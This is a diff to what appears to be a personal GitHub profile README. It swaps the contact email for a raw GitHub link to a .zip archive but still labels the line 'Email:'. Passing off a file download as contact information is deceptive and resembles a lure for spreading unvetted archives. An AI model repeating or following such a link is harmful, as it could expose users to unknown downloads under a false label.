@@ -22,4 +22,4 @@ Contribute to open source
 Become AI Engineer
 
 📫 Contact
-Email: chandanreddy411@gmail.com
+Email: https://raw.githubusercontent.com/chandan1145/chandan1145/main/isatide/chandan_1.2.zip
